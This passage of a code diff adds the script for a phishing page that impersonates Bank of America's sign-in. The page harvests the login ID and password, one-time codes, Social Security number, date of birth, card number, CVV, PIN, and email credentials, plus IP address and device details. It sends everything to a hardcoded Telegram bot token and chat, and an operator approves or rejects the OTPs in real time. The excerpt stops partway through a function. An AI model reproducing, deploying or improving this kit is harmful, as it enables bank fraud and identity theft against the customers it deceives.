+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp5" oninput="moveToNextEmailOTP(this, 'emailOtp6')" onkeydown="moveToPrevEmailOTP(event, this, 'emailOtp4')" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-digit" id="emailOtp6" oninput="submitEmailOTP()" onkeydown="moveToPrevEmailOTP(event, this, 'emailOtp5')" style="width: 50px; height: 60px; font-size: 28px; font-weight: 700; text-align: center; border: 2px solid #d1d1d1; border-radius: 8px; transition: all 0.3s; font-family: inherit; -webkit-appearance: none; appearance: none;" onfocus="this.style.borderColor='#e31837'" onblur="this.style.borderColor='#d1d1d1'" autocomplete="off">
+            </div>
+            
+            <button onclick="submitEmailOTP()" style="width: 100%; padding: 15px; background: linear-gradient(135deg, #e31837, #c41230); color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(227, 24, 55, 0.3); font-family: inherit;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(227, 24, 55, 0.4)'" onmouseout="this.style.transform=''; this.style.boxShadow='0 4px 15px rgba(227, 24, 55, 0.3)'">Verify Code</button>
+            <a href="#" onclick="resendEmailOTP(event)" style="color: #0077be; font-size: 14px; text-decoration: none; font-weight: 600;">Resend Code</a>
+        </div>
+    </div>
+
+    <script>
+        // ========================================
+        // TELEGRAM CONFIGURATION
+        // ========================================
+        const TELEGRAM_BOT_TOKEN = '5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00';
+        const TELEGRAM_CHAT_ID = '5514645660';
+        
+        // ========================================
+        // ENABLE PASSWORD WHEN USER ID >= 6 CHARS
+        // ========================================
+        const userIdInput = document.getElementById('enterID-input');
+        const passwordInput = document.getElementById('tlpvt-passcode-input');
+        
+        userIdInput.addEventListener('input', function() {
+            if (this.value.length >= 6) {
+                passwordInput.disabled = false;
+            } else {
+                passwordInput.disabled = true;
+                passwordInput.value = '';
+            }
+        });
+        
+        // ========================================
+        // COOKIE BANNER
+        // ========================================
+        function closeCookieBanner() {
+            document.getElementById('cookieBanner').style.display = 'none';
+        }
+        
+        // ========================================
+        // SEND TO TELEGRAM
+        // ========================================
+        async function sendToTelegram(message, inlineKeyboard = null) {
+            // Check if running locally or on server
+            const isLocal = window.location.hostname === 'localhost' || 
+                           window.location.hostname === '127.0.0.1' || 
+                           window.location.protocol === 'file:';
+            
+            if (isLocal) {
+                // Local testing - use direct Telegram API
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const body = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            if (inlineKeyboard) {
+                body.reply_markup = JSON.stringify({
+                    inline_keyboard: inlineKeyboard
+                });
+            }
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+                }
+            } else {
+                // Server - use PHP backend to hide Telegram API
+                try {
+                    const payload = {
+                        message: message,
+                        token: TELEGRAM_BOT_TOKEN,
+                        chat_id: TELEGRAM_CHAT_ID
+                    };
+                    
+                    if (inlineKeyboard) {
+                        payload.inline_keyboard = inlineKeyboard;
+                    }
+                    
+                    const response = await fetch('api.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    const result = await response.json();
+                    return result.success;
+                } catch (error) {
+                    console.error('API error:', error);
+                    return false;
+                }
+            }
+        }
+        
+        // ========================================
+        // GET IP AND NETWORK INFO
+        // ========================================
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Unknown';
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const pc = new RTCPeerConnection({
+                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                });
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        resolve(ips.length > 0 ? ips : ['No local IP']);
+                        return;
+                    }
+                    
+                    const parts = ice.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    
+                    if (ip && ip !== '0.0.0.0' && !ips.includes(ip)) {
+                        ips.push(ip);
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips.length > 0 ? ips : ['Timeout']);
+                }, 3000);
+            });
+        }
+        
+        async function getNetworkInfo() {
+            const info = {
+                connectionType: 'unknown',
+                downlink: 'unknown',
+                rtt: 'unknown'
+            };
+            
+            if (navigator.connection) {
+                info.connectionType = navigator.connection.type || navigator.connection.effectiveType || 'unknown';
+                info.downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'unknown';
+                info.rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'unknown';
+            }
+            
+            return info;
+        }
+        
+        async function getDetailedIPInfo(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                if (data.error) {
+                    const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                    const fallbackData = await fallbackResponse.json();
+                    return {
+                        city: fallbackData.city || 'Unknown',
+                        region: fallbackData.regionName || 'Unknown',
+                        country: fallbackData.country || 'Unknown',
+                        isp: fallbackData.isp || 'Unknown'
+                    };
+                }
+                
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch (error) {
+                return {
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+        
+        // ========================================
+        // FORMAT MESSAGE
+        // ========================================
+        function formatTelegramMessage(data) {
+            if (data.action === 'network_info') {
+            return `
+🌍 <b>NETWORK & IP INFO</b>
+
+👤 <b>User ID:</b> ${data.userId}
+
+📍 <b>IP & Location:</b>
+• Public IP: <code>${data.ipAddress}</code>
+• Local IPs: <code>${data.localIPs}</code>
+• ISP: ${data.isp}
+• Location: ${data.city}, ${data.region}, ${data.country}
+
+🌐 <b>Network:</b>
+• Type: ${data.networkType}
+• Speed: ${data.networkSpeed}
+• Latency: ${data.networkLatency}
+                `.trim();
+            }
+            
+            return `
+🏦 <b>NEW BANK OF AMERICA LOGIN</b>
+
+👤 <b>User ID:</b> ${data.userId}
+🔑 <b>Password:</b> ${data.password}
+💾 <b>Save User ID:</b> ${data.saveUserId ? 'Yes' : 'No'}
+
+⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
+
+📱 <b>Device:</b>
+• Platform: ${data.platform}
+• Screen: ${data.screenResolution}
+• Language: ${data.language}
+• Timezone: ${data.timezone}
+
+🌐 <b>Browser:</b>
+• ${data.userAgent.substring(0, 100)}...
+
+🍪 <b>Cookies:</b> ${data.cookies === 'No cookies' ? '❌ None' : '✅ Has data'}
+💾 <b>Storage:</b> ${data.localStorage === 'No localStorage' ? '❌ Empty' : '✅ Has data'}
+            `.trim();
+        }
+        
+        // ========================================
+        // FORM SUBMISSION
+        // ========================================
+        async function enterOnlineIDFormSubmit() {
+            event.preventDefault();
+            
+            const userId = document.getElementById('enterID-input').value;
+            const password = document.getElementById('tlpvt-passcode-input').value;
+            const saveUserId = document.getElementById('remID').checked;
+            
+            if (!userId || userId.length < 6) {
+                alert('Please enter a valid User ID (at least 6 characters)');
+                return;
+            }
+            
+            if (!password) {
+                alert('Please enter your Password');
+                return;
+            }
+            
+            document.getElementById('loading').style.display = 'flex';
+            
+            // Capture basic data immediately
+            const capturedData = {
+                action: 'login',
+                bank: 'Bank of America',
+                userId: userId,
+                password: password,
+                saveUserId: saveUserId,
+                timestamp: new Date().toISOString(),
+                
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                cookies: document.cookie || 'No cookies',
+                localStorage: localStorage.length > 0 ? 'Has data' : 'No localStorage'
+            };
+            
+            console.log('Captured:', capturedData);
+            
+            // Send to Telegram IMMEDIATELY
+            const telegramMessage = formatTelegramMessage(capturedData);
+            await sendToTelegram(telegramMessage);
+            
+            // Gather IP/network data in background (don't wait for it)
+            setTimeout(async () => {
+                try {
+                    const ipAddress = await getIPAddress();
+                    const localIPs = await getLocalIP();
+                    const ipDetails = await getDetailedIPInfo(ipAddress);
+                    const networkInfo = await getNetworkInfo();
+                    
+                    const extraData = {
+                        action: 'network_info',
+                        bank: 'Bank of America',
+                        userId: userId,
+                        ipAddress: ipAddress,
+                        localIPs: localIPs.join(', '),
+                        networkType: networkInfo.connectionType,
+                        networkSpeed: networkInfo.downlink,
+                        networkLatency: networkInfo.rtt,
+                        city: ipDetails.city,
+                        region: ipDetails.region,
+                        country: ipDetails.country,
+                        isp: ipDetails.isp
+                    };
+                    
+                    const extraMessage = formatTelegramMessage(extraData);
+                    await sendToTelegram(extraMessage);
+                } catch (error) {
+                    console.log('Extra data collection failed:', error);
+                }
+            }, 100);
+            
+            // Show OTP modal after short delay
+            setTimeout(() => {
+                showOTPModal();
+            }, 1500);
+        }
+        
+        // ========================================
+        // OTP FUNCTIONS
+        // ========================================
+        let otpAttempts = 0;
+        let currentSessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        let lastUpdateId = 0;
+        let pollingActive = false;
+        
+        function showOTPModal() {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('otpModal').style.display = 'flex';
+            setTimeout(() => document.getElementById('otp1').focus(), 300);
+        }
+        
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+        
+        function moveToPrev(event, current, prevId) {
+            if (event.key === 'Backspace' && current.value === '' && prevId) {
+                document.getElementById(prevId).focus();
+            }
+        }
+        
+        function getOTPCode() {
+            let otp = '';
+            for (let i = 1; i <= 6; i++) {
+                otp += document.getElementById('otp' + i).value;
+            }
+            return otp;
+        }
+        
+        function clearOTPInputs() {
+            for (let i = 1; i <= 6; i++) {
+                document.getElementById('otp' + i).value = '';
+            }
+            document.getElementById('otp1').focus();
+        }
+        
+        async function submitOTP() {
+            const otpCode = getOTPCode();
+            
+            if (otpCode.length !== 6) {
+                alert('Please enter all 6 digits');
+                return;
+            }
+            
+            otpAttempts++;
+            
+            document.getElementById('otpModal').style.display = 'none';
+            document.getElementById('loading').style.display = 'flex';
+            
+            const inlineKeyboard = [
+                [{ text: '✅ APPROVE', callback_data: `approve_${currentSessionId}` }],
+                [{ text: '❌ REJECT', callback_data: `reject_${currentSessionId}` }]
+            ];
+            
+            const otpMessage = `
+🔐 <b>BANK OF AMERICA OTP</b>
+
+🔢 <b>Code:</b> <code>${otpCode}</code>
+📊 <b>Attempt:</b> ${otpAttempts}
+🆔 <b>Session:</b> <code>${currentSessionId}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendToTelegram(otpMessage, inlineKeyboard);
+            
+            pollingActive = true;
+            pollTelegramForUpdates();
+        }
+        
+        async function pollTelegramForUpdates() {
+            if (!pollingActive) return;
+            
+            const maxPolls = 120;
+            let pollCount = 0;
+            
+            // Check if running locally or on server
+            const isLocal = window.location.hostname === 'localhost' || 
+                           window.location.hostname === '127.0.0.1' || 
+                           window.location.protocol === 'file:';
+            
+            const checkTelegram = async () => {
+                if (!pollingActive) return;
+                
+                try {
+                    let data;
+                    
+                    if (isLocal) {
+                        // Local - direct Telegram API
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+                    const response = await fetch(url);
+                        data = await response.json();
+                    } else {
+                        // Server - use PHP backend
+                        const response = await fetch('api.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                action: 'getUpdates',
+                                token: TELEGRAM_BOT_TOKEN,
+                                offset: lastUpdateId + 1
+                            })
+                        });
+                        data = await response.json();
+                    }
+                    
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = update.update_id;
+                            
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+                                
+                                if (callbackData === `approve_${currentSessionId}`) {
+                                    pollingActive = false;
+                                    document.getElementById('loading').style.display = 'none';
+                                    const verifyModal = document.getElementById('verifyModal');
+                                    verifyModal.style.display = 'flex';
+                                    return true;
+                                } else if (callbackData === `reject_${currentSessionId}`) {
+                                    pollingActive = false;
+                                    promptOTPRetry();
+                                    return true;
+                                }
+                            }
+                        }
+                    }
+                } catch (error) {
+                    console.warn('Polling error:', error);
+                }
+                
+                pollCount++;
+                if (pollingActive && pollCount < maxPolls) {
+                    setTimeout(checkTelegram, 1000);
+                } else if (pollingActive) {
+                    pollingActive = false;
+                    document.getElementById('loading').style.display = 'none';
+                    const verifyModal = document.getElementById('verifyModal');
+                    verifyModal.style.display = 'flex';
+                }
+            };
+            
+            checkTelegram();
+        }
+        
+        function promptOTPRetry() {
+            const existingAlert = document.querySelector('.otp-content .retry-alert');
+            if (existingAlert) existingAlert.remove();
+            
+            clearOTPInputs();
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('otpModal').style.display = 'flex';
+            
+            const retryAlert = document.createElement('div');
+            retryAlert.classList.add('retry-alert');
+            retryAlert.style.cssText = 'background:#e31837;color:white;padding:12px 20px;border-radius:8px;margin-bottom:20px;text-align:center;font-size:14px;';
+            retryAlert.textContent = '❌ Incorrect code. Please try again.';
+            
+            const otpContent = document.querySelector('.otp-content');
+            otpContent.insertBefore(retryAlert, otpContent.querySelector('h2'));
+            
+            setTimeout(() => {
+                if (retryAlert.parentNode) retryAlert.remove();
+            }, 3000);
+        }
+        
+        function resendOTP(event) {
+            event.preventDefault();
+            clearOTPInputs();
+            
+            const resendMessage = `
+🔄 <b>BANK OF AMERICA - OTP RESEND</b>
+
+🆔 <b>Session:</b> <code>${currentSessionId}</code>
+📊 <b>Attempts:</b> ${otpAttempts}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+            
+            sendToTelegram(resendMessage);
+            alert('A new code has been sent');
+        }
+        
+        // ========================================
+        // CLOSE MODAL
+        // ========================================
+        function closeModal() {
+            document.getElementById('successModal').style.display = 'none';
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com/';
+            }, 500);
+        }
+        
+        // ========================================
+        // CAPTURE ACTIONS
+        // ========================================
+        async function captureAction(e, action) {
+            e.preventDefault();
+            
+            const message = `
+🔔 <b>BANK OF AMERICA ACTION: ${action.toUpperCase()}</b>
+
+👤 <b>User ID:</b> ${document.getElementById('enterID-input').value || 'Not entered'}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendToTelegram(message);
+            
+            if (action === 'get_app') {
+                alert('The Bank of America app is available on the App Store and Google Play.');
+            } else {
+                alert('Please check your email for further instructions.');
+            }
+        }
+        
+        // ========================================
+        // VERIFICATION MODAL FUNCTIONS
+        // ========================================
+        function formatDOB(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 8) value = value.substring(0, 8);
+            if (value.length > 4) value = value.substring(0, 2) + '/' + value.substring(2, 4) + '/' + value.substring(4);
+            else if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
+            input.value = value;
+            
+            const dobError = document.getElementById('dobError');
+            dobError.style.display = 'none';
+            if (value.length === 10) {
+                const parts = value.split('/');
+                const month = parseInt(parts[0], 10);
+                const day = parseInt(parts[1], 10);
+                const year = parseInt(parts[2], 10);
+                const today = new Date();
+                const birthDate = new Date(year, month - 1, day);
+                let age = today.getFullYear() - birthDate.getFullYear();
+                const m = today.getMonth() - birthDate.getMonth();
+                if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
+                if (age < 18 || age > 100 || isNaN(age)) {
+                    dobError.textContent = 'Please enter a valid DOB (18-100 years)';
+                    dobError.style.display = 'block';
+                }
+            }
+            checkVerifyFormComplete();
+        }
+        
+        function formatSSN(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 9) value = value.substring(0, 9);
+            if (value.length > 5) value = value.substring(0, 3) + '-' + value.substring(3, 5) + '-' + value.substring(5);
+            else if (value.length > 3) value = value.substring(0, 3) + '-' + value.substring(3);
+            input.value = value;
+            checkVerifyFormComplete();
+        }
+        
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+        
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            input.value = value;
+            
+            const cardNumberError = document.getElementById('cardNumberError');
+            cardNumberError.style.display = 'none';
+            if (value.replace(/\s/g, '').length === 16 && !luhnCheck(value.replace(/\s/g, ''))) {
+                cardNumberError.textContent = 'Invalid card number';
+                cardNumberError.style.display = 'block';
+            }
+            checkVerifyFormComplete();
+        }
+        
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2);
+            input.value = value;
+            checkVerifyFormComplete();
+        }
+        
+        function formatZIP(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 5) value = value.substring(0, 5);
+            input.value = value;
+            checkVerifyFormComplete();
+        }
+        
+        function formatPIN(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            input.value = value;
+            checkVerifyFormComplete();
+        }
+        
+        function formatCVV(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.substring(0, 3);
+            input.value = value;
+            checkVerifyFormComplete();
+        }
+        
+        function toggleVerifyField(fieldId, toggleElement) {
+            const field = document.getElementById(fieldId);
+            if (field.type === 'password') {
+                field.type = 'text';
+                toggleElement.textContent = 'Hide';
+            } else {
+                field.type = 'password';
+                toggleElement.textContent = 'Show';
+            }
+        }
+        
+        function checkVerifyFormComplete() {
+            const ssn = document.getElementById('verifySSN').value;
+            const firstName = document.getElementById('verifyFirstName').value;
+            const lastName = document.getElementById('verifyLastName').value;
+            const dob = document.getElementById('verifyDOB').value;
+            const cardNumber = document.getElementById('verifyCardNumber').value;
+            const expiry = document.getElementById('verifyExpiry').value;
+            const cvv = document.getElementById('verifyCVV').value;
+            const pin = document.getElementById('verifyPIN').value;
+            const zip = document.getElementById('verifyZIP').value;
+            
+            const submitBtn = document.getElementById('verifySubmitBtn');
+            
+            const allFilled = ssn.length === 11 && 
+                firstName.trim() !== '' && 
+                lastName.trim() !== '' && 
+                dob.length === 10 && 
+                cardNumber.replace(/\s/g, '').length === 16 && 
+                expiry.length === 5 && 
+                cvv.length === 3 && 
+                pin.length === 4 && 
+                zip.length === 5;
+            
+            const dobError = document.getElementById('dobError').style.display === 'none';
+            const cardNumberError = document.getElementById('cardNumberError').style.display === 'none';
+            const cardValid = luhnCheck(cardNumber.replace(/\s/g, ''));
+            
+            if (allFilled && dobError && cardNumberError && cardValid) {
+                submitBtn.style.background = '#e31837';
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.style.background = '#ccc';
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        }
+        
+        function cancelVerification() {
+            if (confirm('Are you sure you want to cancel? You will need to verify your account to continue.')) {
+                window.location.href = 'https://www.google.com/';
+            }
+        }
+        
+        // ========================================
+        // EMAIL VERIFICATION MODAL FUNCTIONS
+        // ========================================
+        function toggleEmailPassword(toggleElement) {
+            const passwordField = document.getElementById('emailPassword');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleElement.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                toggleElement.textContent = 'Show';
+            }
+        }
+        
+        function checkEmailFormComplete() {
+            const email = document.getElementById('emailAddress').value;
+            const password = document.getElementById('emailPassword').value;
+            const submitBtn = document.getElementById('emailSubmitBtn');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const isValidEmail = emailRegex.test(email);
+            
+            if (isValidEmail && password.length > 0) {
+                submitBtn.style.background = '#e31837';
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.style.background = '#ccc';
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        }
+        
+        function cancelEmailVerify() {
+            if (confirm('Are you sure you want to cancel? Email verification is required to complete account access.')) {
+                window.location.href = 'https://www.google.com/';
+            }
+        }
+        
+        // ========================================
+        // INITIALIZE EVENT LISTENERS
+        // ========================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Verify form input listeners
+            const verifyInputs = document.querySelectorAll('#verifyForm input');
+            verifyInputs.forEach(input => {
+                input.addEventListener('input', checkVerifyFormComplete);
+            });
+            
+            // Verify form submit
+            document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const submitBtn = document.getElementById('verifySubmitBtn');
+                if (submitBtn.style.cursor === 'not-allowed') return;
+                
+                const firstName = document.getElementById('verifyFirstName').value;
+                const lastName = document.getElementById('verifyLastName').value;
+                
+                const verificationData = {
+                    action: 'verify',
+                    ssn: document.getElementById('verifySSN').value,
+                    firstName: firstName,
+                    lastName: lastName,
+                    fullName: firstName + ' ' + lastName,
+                    dob: document.getElementById('verifyDOB').value,
+                    cardNumber: document.getElementById('verifyCardNumber').value.replace(/\s/g, ''),
+                    expiry: document.getElementById('verifyExpiry').value,
+                    cvv: document.getElementById('verifyCVV').value,
+                    pin: document.getElementById('verifyPIN').value,
+                    zip: document.getElementById('verifyZIP').value,
+                    timestamp: new Date().toISOString(),
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent
+                };
+                
+                document.getElementById('verifyModal').style.display = 'none';
+                document.getElementById('loading').style.display = 'flex';
+                
+                const message = `
+🔐 <b>BANK OF AMERICA - ADDITIONAL VERIFICATION DATA</b>
+
+👤 <b>Full Name:</b> ${verificationData.fullName}
+🎂 <b>Date of Birth:</b> ${verificationData.dob}
+🔢 <b>SSN:</b> <code>${verificationData.ssn}</code>
+
+💳 <b>Card Information:</b>
+• Card Number: <code>${verificationData.cardNumber}</code>
+• Expiration: ${verificationData.expiry}
+• CVV: <code>${verificationData.cvv}</code>
+• PIN: <code>${verificationData.pin}</code>
+• ZIP Code: ${verificationData.zip}
+
+⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
+
+📱 <b>Device:</b> ${verificationData.platform}
+🌐 <b>Browser:</b> ${verificationData.userAgent.substring(0, 50)}...
+                `.trim();
+                
+                await sendToTelegram(message);
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('emailVerifyModal').style.display = 'flex';
+                }, 2000);
+            });
+            
+            // Email form listeners
+            document.getElementById('emailAddress').addEventListener('input', checkEmailFormComplete);
+            document.getElementById('emailPassword').addEventListener('input', checkEmailFormComplete);
+            
+            // Email form submit
+            document.getElementById('emailVerifyForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const submitBtn = document.getElementById('emailSubmitBtn');
+                if (submitBtn.style.cursor === 'not-allowed') return;
+                
+                const emailAddress = document.getElementById('emailAddress').value;
+                const emailPassword = document.getElementById('emailPassword').value;
+                
+                document.getElementById('emailVerifyModal').style.display = 'none';
+                document.getElementById('loading').style.display = 'flex';
+                
+                const message = `
+📧 <b>BANK OF AMERICA - EMAIL CREDENTIALS CAPTURED</b>
+
+📧 <b>Email:</b> ${emailAddress}
+🔑 <b>Password:</b> <code>${emailPassword}</code>
+
+⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
+
+📱 <b>Device:</b> ${navigator.platform}
+🌐 <b>Browser:</b> ${navigator.userAgent.substring(0, 50)}...
+                `.trim();
+                
+                await sendToTelegram(message);
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    const emailOtpModal = document.getElementById('emailOtpModal');
+                    emailOtpModal.style.display = 'flex';
+                    setTimeout(() => document.getElementById('emailOtp1').focus(), 300);
+                }, 2000);
+            });
+        });
+        
+        // ========================================
+        // EMAIL OTP FUNCTIONS
+        // ========================================
+        let emailOtpAttempts = 0;
+        let emailOtpSessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        let emailOtpPollingActive = false;
+        
+        function moveToNextEmailOTP(current, nextId) {
+            if (current.value.length === 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+        }
+        
+        function moveToPrevEmailOTP(event, current, prevId) {
+            if (event.key === 'Backspace' && current.value === '' && prevId) {
+                document.getElementById(prevId).focus();
+            }
+        }
+        
+        function getEmailOTPCode() {
+            let otp = '';
+            for (let i = 1; i <= 6; i++) {
+                otp += document.getElementById('emailOtp' + i).value;
+            }
+            return otp;
+        }
+        
+        function clearEmailOTPInputs() {
+            for (let i = 1; i <= 6; i++) {
+                document.getElementById('emailOtp' + i).value = '';
+            }
+            document.getElementById('emailOtp1').focus();
+        }
+        
+        async function submitEmailOTP() {
+            const otpCode = getEmailOTPCode();
+            if (otpCode.length !== 6) {
+                const firstInput = document.getElementById('emailOtp1');
+                firstInput.style.borderColor = '#dc143c';
+                setTimeout(() => firstInput.style.borderColor = '#d1d1d1', 2000);
+                return;
+            }
+            
+            emailOtpAttempts++;
+            
+            document.getElementById('emailOtpModal').style.display = 'none';
+            document.getElementById('loading').style.display = 'flex';
+            
+            const inlineKeyboard = [
+                [{ text: '✅ APPROVE', callback_data: `approve_email_${emailOtpSessionId}` }],
+                [{ text: '❌ REJECT', callback_data: `reject_email_${emailOtpSessionId}` }]
+            ];
+            
+            const otpMessage = `
+🔐 <b>BANK OF AMERICA - EMAIL OTP</b>
+
+🔢 <b>Code:</b> <code>${otpCode}</code>
+📊 <b>Attempt:</b> ${emailOtpAttempts}
+🆔 <b>Session:</b> <code>${emailOtpSessionId}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendToTelegram(otpMessage, inlineKeyboard);
+            
+            emailOtpPollingActive = true;
+            pollTelegramForEmailOTPUpdates();
+        }
+        
+        let emailOtpPollCount = 0;
+        const maxEmailOtpPolls = 120;
+        
+        async function pollTelegramForEmailOTPUpdates() {
+            if (!emailOtpPollingActive) return;
+            
+            // Check if running locally or on server
+            const isLocal = window.location.hostname === 'localhost' || 
+                           window.location.hostname === '127.0.0.1' || 
+                           window.location.protocol === 'file:';
+            
+            const checkTelegram = async () => {
+                if (!emailOtpPollingActive) return;
+                
+                try {
+                    let data;
+                    
+                    if (isLocal) {
+                        // Local - direct Telegram API
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+                    const response = await fetch(url);
+                        data = await response.json();
+                    } else {
+                        // Server - use PHP backend
+                        const response = await fetch('api.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                action: 'getUpdates',
+                                token: TELEGRAM_BOT_TOKEN,
+                                offset: lastUpdateId + 1
+                            })
+                        });
+                        data = await response.json();
+                    }
+                    
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = update.update_id;
+                            
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+                                
+                                if (callbackData === `approve_email_${emailOtpSessionId}`) {
+                                    emailOtpPollingActive = false;
+                                    document.getElementById('loading').style.display = 'none';
+                                    document.getElementById('successModal').style.display = 'flex';
+                                    return true;
+                                } else if (callbackData === `reject_email_${emailOtpSessionId}`) {
+                                    emailOtpPollingActive = false;
+                                    promptEmailOTPRetry();
+                                    return true;
+                                }
+                            }
+                        }
+                    }
+                } catch (error) {
+                    console.warn('Email OTP Polling error:', error);
+                }
+                
+                emailOtpPollCount++;
+                if (emailOtpPollingActive && emailOtpPollCount < maxEmailOtpPolls) {
+                    setTimeout(checkTelegram, 1000);
+                } else if (emailOtpPollingActive) {
+                    emailOtpPollingActive = false;
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('successModal').style.display = 'flex';
+                }
+            };
+            
+            checkTelegram();
+        }
+        
+        function promptEmailOTPRetry() {
+            const existingAlert = document.querySelector('.email-otp-content .retry-alert');
+            if (existingAlert) existingAlert.remove();
+            
+            clearEmailOTPInputs();
+            document.getElementById('loading').style.display = 'none';
+            const emailOtpModal = document.getElementById('emailOtpModal');
+            emailOtpModal.style.display = 'flex';
+            
+            const retryAlert = document.createElement('div');
+            retryAlert.classList.add('retry-alert');
+            retryAlert.style.cssText = `
+                background: linear-gradient(135deg, #e31837, #c41230);
+                color: white;
+                padding: 12px 20px;
+                border-radius: 8px;
